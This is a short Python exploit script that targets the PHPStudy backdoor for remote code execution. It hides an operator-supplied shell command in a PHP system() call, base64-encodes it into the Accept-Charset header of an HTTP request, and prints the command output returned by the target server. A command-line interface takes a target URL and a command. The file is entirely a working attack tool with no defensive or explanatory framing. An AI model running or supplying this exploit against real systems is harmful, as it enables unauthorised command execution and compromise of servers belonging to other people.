# -*- coding: utf-8 -*-
# @Author  : Alphabug
# @Time    : 2021/5/10 9:48
# @PRODUCT : PyCharm
# @Function: phpstudy后门.py

import requests,argparse,re,base64
def exp(url,shell):
    try:
        # shell
        shell = "echo \"abds\";system(\""+shell+"\");echo \"abds\";"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Charset': base64.b64encode(shell.encode()).decode()
        }
        response = requests.get(url=url,headers=headers,timeout=3)
        text = re.findall(r"abds(.+?)abds",response.text,re.S)
        print(text[0])
        if shell == "0":
            return
    except:
        print("异常")
if __name__ == '__main__':
    alphabug = argparse.ArgumentParser(description="PHPStudy_BackDoor RCE,\tAuthor:Alphabug@RedTeam.site")
    alphabug.add_argument("-u", "--url", help="URL,For example:http://192.168.128.139/", required=True, )
    alphabug.add_argument("-c", "--cmd", help="CMD,For example:whoami", required=True)
    args = alphabug.parse_args()

    url = args.url
    cmd = args.cmd
    # url = "http://192.168.128.139/"
    exp(url,cmd)
